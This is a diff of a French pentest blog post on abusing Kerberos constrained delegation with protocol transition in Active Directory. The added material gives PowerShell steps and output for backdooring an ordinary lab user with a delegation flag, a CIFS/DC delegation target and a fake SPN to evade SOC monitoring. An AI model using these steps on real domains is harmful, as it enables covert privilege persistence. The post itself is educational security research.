@@ -11,21 +11,29 @@ Bonjour,
 
 Aujourd'hui nous allons parler de l'exploitation des extensions de protocole Kerberos [S4U2Self](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13) et [S4U2Proxy](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a) afin d'impersonifier un utilisateur privilégié du domaine.  
 
-L'objectif de ce post est de nous concentrer sur la [délégation contrainte avec transition de protocole](https://docs.microsoft.com/fr-fr/previous-versions/windows/it-pro/windows-server-2003/cc739587(v=ws.10)) que nous abrègerons ```T2A4D``` (TrustedToAuthForDelegation); comment l'énumérer, comment l'exploiter et s'en servir comme méthode de persistance.  
+L'objectif de ce post est de nous concentrer sur la [délégation contrainte avec transition de protocole](https://docs.microsoft.com/fr-fr/previous-versions/windows/it-pro/windows-server-2003/cc739587(v=ws.10)) que nous abrègerons ```T2A4D``` (**TrustedToAuthForDelegation**); comment l'énumérer, comment l'exploiter et s'en servir comme méthode de persistance.  
 <!--more-->
 Pour ne pas réinventer la roue, vous trouverez un très bon article introduisant la délégation kerberos sur le blog [hackndo](https://beta.hackndo.com/constrained-unconstrained-delegation/).  
 
 # Mise en place de la délégation contrainte avec transition de protocole + msDS-AllowedToDelegateTo  
 
+## Prérequis  
+
+Il y a deux méthodes pour installer les cmdlets ActiveDirectory:  
+ 1. ```Get-WindowsCapability -Name Rsat.ActiveDirectory* -Online | Add-WindowsCapability -Online``` (peut également se faire offline à partir de l'iso téléchargeable [ici](https://my.visualstudio.com/Downloads/Featured))
+ 2. [https://github.com/samratashok/ADModule](https://github.com/samratashok/ADModule)  
+  
+## TrustedToAuthForDelegation
+
 ```powershell
 Get-ADComputer -Identity srv | Set-ADAccountControl -TrustedToAuthForDelegation $True
 Set-ADComputer -Identity srv -Add @{'msDS-AllowedToDelegateTo'=@('TIME/DC.WINDOMAIN.LOCAL','TIME/DC')}
 ```
-
+  
 ou via GUI:  
-
+  
 ![t2a4d]({{ site.url }}/public/images/t2a4d/setup_t2a4d.png)
-
+  
 Notons que la délégation contrainte peut également être basée sur la ressource (écriture du champs **msds-allowedtoactonbehalfofotheridentity** de ```MACHINE$```). Il semble en effet plus cohérent de donner la légitimité à une ressource de décider quelle autre ressource peut y accéder.  
 
 Rentrons dans le vif du sujet.  
@@ -41,7 +49,7 @@ PS C:\tools> Get-DomainObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.
 samaccounttype           : MACHINE_ACCOUNT
 distinguishedname        : CN=SRV,CN=Computers,DC=windomain,DC=local
 useraccountcontrol       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION, TRUSTED_TO_AUTH_FOR_DELEGATION
-msds-allowedtodelegateto : {TIME/DC01, TIME/DC01.WINDOMAIN.LOCAL, TIME/DC, TIME/DC.WINDOMAIN.LOCAL}
+msds-allowedtodelegateto : {TIME/DC, TIME/DC.WINDOMAIN.LOCAL}
 ```
 
 L'outil [Invoke-Recon](https://github.com/phackt/Invoke-Recon) trouvera tout cela pour vous.  
@@ -74,7 +82,7 @@ Le compte impersonifié doit pouvoir être délégué.
 </pre>
 Il ne doit être ni [Protected Users](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group), ni "**Account is sensitive and cannot be delegated**".  
   
-# Exploitation  
+# <a name="Exploitation"></a>Exploitation  
 
 Il sera nécessaire au préalable de compiler Rubeus (depuis le repo [Rubeus](https://github.com/GhostPack/Rubeus), lancer le projet, ```Build -> Build Solution```).  
 
@@ -320,8 +328,75 @@ Pour positionner l'attribut **TRUSTED_TO_AUTH_FOR_DELEGATION**, il nous faut le 
 
 *Fortunately Microsoft protect any user from setting this flag unless they are listed in the User Rights Assignment setting "Enable computer and user accounts to be trusted for delegation" (SeEnableDelegationPrivilege) on the Domain Controller. So by default only members of BUILTIN\Administrators (i.e. Domain Admins/Enterprise Admins) have the right to modify these delegation settings.*
   
-Une méthode de persistance intéressante consiste, à partir d'un utilisateur compromis possédant le privilège ```SeEnableDelegationPrivilege```, à positionner la valeur ```TRUSTED_TO_AUTH_FOR_DELEGATION``` sur un autre utilisateur compromis lambda pouvant être délégué, et à éditer le champs ```msDS-AllowedToDelegateTo``` avec le SPN ```HOST/DC``` par exemple, permettant ainsi de rejouer l'attaque.  
+Une méthode de persistance intéressante consiste, à partir d'un utilisateur compromis possédant le privilège ```SeEnableDelegationPrivilege```, à positionner la valeur ```TRUSTED_TO_AUTH_FOR_DELEGATION``` sur un autre utilisateur compromis lambda pouvant être délégué, et à éditer le champs ```msDS-AllowedToDelegateTo``` avec le SPN ```CIFS/DC``` par exemple, permettant ainsi de rejouer l'attaque.  
   
+## T2A4D sur un utilisateur arbitraire du domaine
+  
+Vous êtes admin de dom, cependant les [groupes protégés](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory) sont supervisés par le SOC, ces derniers ont leurs descripteurs de sécurité remis en état par le mécanisme de ```SDProp``` ([AdminSDHolder](https://social.technet.microsoft.com/wiki/contents/articles/22331.adminsdholder-protected-groups-and-security-descriptor-propagator.aspx)), ..., autant d'éléments qui vous font dire que vous aimeriez backdooré un utilisateur qui peut passer le plus de temps possible sous les radars.  
+  
+Jouons cette méthode dans notre lab. l'utilisateur ```bleponge``` est un utilisateur du domaine tout ce qui a de plus banal, ```admin01``` est ce pour quoi vous avez tant sué ces derniers jours:  
+  
+```powershell
+PS C:\> WMIC OS Get Name
+Name
+Microsoft Windows 10 Education N|C:\Windows|\Device\Harddisk0\Partition2
+
+PS C:\> whoami
+windomain\admin01
+PS C:\> net user admin01 /domain | Select-String "Group"
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Domain Admins
+
+PS C:\> net user bleponge /domain | Select-String "Group"
+
+Local Group Memberships
+Global Group memberships     *Domain Users
+
+PS C:\> Get-DomainUser -Identity bleponge -Properties DistinguishedName,sAMAccountName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
+
+
+samaccounttype     : USER_OBJECT
+distinguishedname  : CN=Bob ble. Leponge,CN=Users,DC=windomain,DC=local
+useraccountcontrol : NORMAL_ACCOUNT
+samaccountname           : bleponge
+
+
+
+PS C:\> Get-ADUser -Identity bleponge | Set-ADAccountControl -TrustedToAuthForDelegation $True
+PS C:\> Set-ADUSer -Identity bleponge -Add @{'msDS-AllowedToDelegateTo'=@('CIFS/DC.WINDOMAIN.LOCAL','CIFS/DC')}
+PS C:\> Set-DomainObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+PS C:\> Get-DomainUser -Identity bleponge -Properties DistinguishedName,sAMAccountName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
+
+
+samaccounttype           : USER_OBJECT
+distinguishedname        : CN=Bob ble. Leponge,CN=Users,DC=windomain,DC=local
+useraccountcontrol       : NORMAL_ACCOUNT
+msds-allowedtodelegateto : {CIFS/DC, CIFS/DC.WINDOMAIN.LOCAL}
+samaccountname           : bleponge
+
+
+
+PS C:\>
+```
+  
+Attention à la commande ```Set-DomainObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}```. En effet le bon sens nous dit qu'un utilisateur sera légitime pour délégeur si ce dernier apparait comme compte de service. Sans positionner de SPN sur l'utilisateur ```bleponge```, Rubeus nous a tout simplement propagé une exception non catchée:  
+```
+...
+[!] Unhandled Rubeus exception:
+
+System.NullReferenceException: Object reference not set to an instance of an object.
+   at Rubeus.S4U.S4U2Proxy(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, Boolean opsec)
+   at Rubeus.S4U.Execute(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, String targetDomainController, String targetDomain, Boolean s, Boolean opsec, String requestDomain, String impersonateDomain)
+   at Rubeus.Commands.S4u.Execute(Dictionary`2 arguments)
+   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
+   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)
+```
+  
+Maintenant retournons sur notre section [Exploitation](#Exploitation) que nous déroulons dans le contexte de notre utilisateur ```bleponge```.  
+  
+## SeEnableDelegationPrivilege
+
 Nous pouvons également attribuer le privilège ```SeEnableDelegationPrivilege``` à un utilisateur, ce dernier pouvant ainsi positionner à son tour le ```TRUSTED_TO_AUTH_FOR_DELEGATION``` sur une autre ressource. Cependant, nous aurons également besoin des droits nécessaires pour écrire le champs ```msDS-AllowedToDelegateTo```.  
   
 # The End
